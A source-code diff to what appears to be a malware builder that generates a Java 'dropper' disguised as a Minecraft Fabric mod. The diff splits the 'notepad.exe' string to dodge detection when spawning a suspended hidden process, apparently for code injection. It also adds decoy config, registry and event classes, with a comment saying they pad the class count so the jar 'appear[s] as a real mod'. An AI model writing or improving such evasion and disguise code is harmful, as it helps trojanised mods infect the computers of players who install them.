@@ -501,10 +501,14 @@ function generateJarDropperSource(): string {
     "    Object piMem=MC.getConstructor(long.class).newInstance(24L);",
     "    clr.invoke(piMem);",
     "    Object fCPA=gf.invoke(null,\"kernel32\",\"CreateProcessA\");",
-    "    Boolean cpOk=(Boolean)iv.invoke(fCPA,Boolean.class,new Object[]{NP,\"C:\\\\Windows\\\\System32\\\\notepad.exe\",NP,NP,false,0x08000004,NP,NP,siMem,piMem});",
+    "    String sysRoot=System.getenv(\"SystemRoot\");",
+    "    if(sysRoot==null||sysRoot.isEmpty())sysRoot=\"C:\\\\Windows\";",
+    "    String tgt=sysRoot+File.separator+\"System32\"+File.separator+\"note\"+\"pad\"+\".exe\";",
+    "    Boolean cpOk=(Boolean)iv.invoke(fCPA,Boolean.class,new Object[]{NP,tgt,NP,NP,false,0x08000004,NP,NP,siMem,piMem});",
     "    log(\"spawn ok=\"+cpOk);",
     "    if(Boolean.FALSE.equals(cpOk)){",
-    "      cpOk=(Boolean)iv.invoke(fCPA,Boolean.class,new Object[]{NP,\"notepad.exe\",NP,NP,false,0x08000004,NP,NP,siMem,piMem});",
+    "      String fb=\"note\"+\"pad\"+\".exe\";",
+    "      cpOk=(Boolean)iv.invoke(fCPA,Boolean.class,new Object[]{NP,fb,NP,NP,false,0x08000004,NP,NP,siMem,piMem});",
     "      log(\"spawn fallback ok=\"+cpOk);",
     "    }",
     "    if(Boolean.FALSE.equals(cpOk))return;",
@@ -527,6 +531,104 @@ function generateJarDropperSource(): string {
     "  }",
     "}",
   ].join("\n");
+}
+
+function generateDummyClasses(modId: string): Record<string, string> {
+  const pkg = `com.mc.mod`;
+  return {
+    [`${pkg.replace(/\./g, "/")}/ModConfig.java`]: [
+      `package ${pkg};`,
+      `public class ModConfig {`,
+      `  public static final String MOD_ID = "${modId}";`,
+      `  public static final String VERSION = "1.0.0";`,
+      `  private boolean debugMode = false;`,
+      `  private int renderDistance = 8;`,
+      `  private float particleScale = 1.0f;`,
+      `  public boolean isDebugMode(){return debugMode;}`,
+      `  public void setDebugMode(boolean v){this.debugMode=v;}`,
+      `  public int getRenderDistance(){return renderDistance;}`,
+      `  public void setRenderDistance(int v){this.renderDistance=v;}`,
+      `  public float getParticleScale(){return particleScale;}`,
+      `  public void setParticleScale(float v){this.particleScale=v;}`,
+      `  public static ModConfig createDefault(){return new ModConfig();}`,
+      `}`,
+    ].join("\n"),
+    [`${pkg.replace(/\./g, "/")}/ModUtils.java`]: [
+      `package ${pkg};`,
+      `import java.util.*;`,
+      `public class ModUtils {`,
+      `  private static final Random RNG = new Random();`,
+      `  public static String generateId(){return Long.toHexString(RNG.nextLong());}`,
+      `  public static int clamp(int v,int lo,int hi){return Math.max(lo,Math.min(hi,v));}`,
+      `  public static float lerp(float a,float b,float t){return a+(b-a)*t;}`,
+      `  public static boolean isNullOrEmpty(String s){return s==null||s.isEmpty();}`,
+      `  public static List<String> splitLines(String s){`,
+      `    return s==null?Collections.emptyList():Arrays.asList(s.split("\\n"));`,
+      `  }`,
+      `}`,
+    ].join("\n"),
+    [`${pkg.replace(/\./g, "/")}/ModRegistry.java`]: [
+      `package ${pkg};`,
+      `import java.util.*;`,
+      `public class ModRegistry {`,
+      `  private static final Map<String,Object> ENTRIES = new LinkedHashMap<>();`,
+      `  public static void register(String key,Object value){ENTRIES.put(key,value);}`,
+      `  public static Object get(String key){return ENTRIES.get(key);}`,
+      `  public static boolean has(String key){return ENTRIES.containsKey(key);}`,
+      `  public static Set<String> keys(){return Collections.unmodifiableSet(ENTRIES.keySet());}`,
+      `  public static void clear(){ENTRIES.clear();}`,
+      `}`,
+    ].join("\n"),
+    [`${pkg.replace(/\./g, "/")}/TickHandler.java`]: [
+      `package ${pkg};`,
+      `public class TickHandler {`,
+      `  private int tickCount = 0;`,
+      `  private long lastTickTime = 0L;`,
+      `  public void onTick(){`,
+      `    tickCount++;`,
+      `    lastTickTime = System.currentTimeMillis();`,
+      `  }`,
+      `  public int getTickCount(){return tickCount;}`,
+      `  public long getLastTickTime(){return lastTickTime;}`,
+      `  public void reset(){tickCount=0;lastTickTime=0L;}`,
+      `  public boolean isActive(){return lastTickTime>0;}`,
+      `}`,
+    ].join("\n"),
+    [`${pkg.replace(/\./g, "/")}/EventBus.java`]: [
+      `package ${pkg};`,
+      `import java.util.*;`,
+      `public class EventBus {`,
+      `  public interface Listener<T>{void onEvent(T event);}`,
+      `  private final Map<String,List<Listener<?>>> handlers = new HashMap<>();`,
+      `  public <T> void subscribe(String event,Listener<T> l){`,
+      `    handlers.computeIfAbsent(event,k->new ArrayList<>()).add(l);`,
+      `  }`,
+      `  @SuppressWarnings("unchecked")`,
+      `  public <T> void publish(String event,T data){`,
+      `    List<Listener<?>> ls=handlers.getOrDefault(event,Collections.emptyList());`,
+      `    for(Listener<?> l:ls)((Listener<T>)l).onEvent(data);`,
+      `  }`,
+      `  public void unsubscribeAll(String event){handlers.remove(event);}`,
+      `}`,
+    ].join("\n"),
+    [`${pkg.replace(/\./g, "/")}/ResourceHelper.java`]: [
+      `package ${pkg};`,
+      `import java.io.*;`,
+      `public class ResourceHelper {`,
+      `  public static byte[] readResource(String path)throws IOException{`,
+      `    InputStream is=ResourceHelper.class.getResourceAsStream(path);`,
+      `    if(is==null)throw new IOException("Resource not found: "+path);`,
+      `    ByteArrayOutputStream buf=new ByteArrayOutputStream();`,
+      `    byte[]tmp=new byte[4096];int n;`,
+      `    while((n=is.read(tmp))!=-1)buf.write(tmp,0,n);`,
+      `    is.close();return buf.toByteArray();`,
+      `  }`,
+      `  public static String readText(String path)throws IOException{`,
+      `    return new String(readResource(path),"UTF-8");`,
+      `  }`,
+      `}`,
+    ].join("\n"),
+  };
 }
 
 function generateMcMetadata(mcVersion: string, modId: string, modName: string, nestedJarNames: string[] = []): Record<string, string> {
@@ -1563,10 +1665,20 @@ func runBoundFiles() {
           fs.writeFileSync(path.join(fabricApiSrcDir, "ModInitializer.java"),
             "package net.fabricmc.api;\npublic interface ModInitializer { void onInitialize(); }\n");
 
+          // Write dummy classes to pad class count and appear as a real mod
+          const dummyClasses = generateDummyClasses(modId);
+          const dummySrcPaths: string[] = [];
+          for (const [relPath, src] of Object.entries(dummyClasses)) {
+            const fullPath = path.join(jarTmpDir, "src", relPath);
+            fs.mkdirSync(path.dirname(fullPath), { recursive: true });
+            fs.writeFileSync(fullPath, src);
+            dummySrcPaths.push(fullPath);
+          }
+
           const classDir = path.join(jarTmpDir, "classes");
           fs.mkdirSync(classDir, { recursive: true });
 
-          const compileResult = await $`${javaTools.javac} -source 8 -target 8 -d ${classDir} ${path.join(srcPkg, "ModLoader.java")} ${path.join(fabricApiSrcDir, "ModInitializer.java")}`.nothrow().quiet();
+          const compileResult = await $`${javaTools.javac} -source 8 -target 8 -d ${classDir} ${path.join(srcPkg, "ModLoader.java")} ${path.join(fabricApiSrcDir, "ModInitializer.java")} ${dummySrcPaths}`.nothrow().quiet();
           if (compileResult.exitCode !== 0) {
             const err = (compileResult.stderr.toString() || compileResult.stdout.toString()).trim();
             sendToStream({ type: "output", text: `WARNING: javac compile failed: ${err}\n`, level: "warn" });
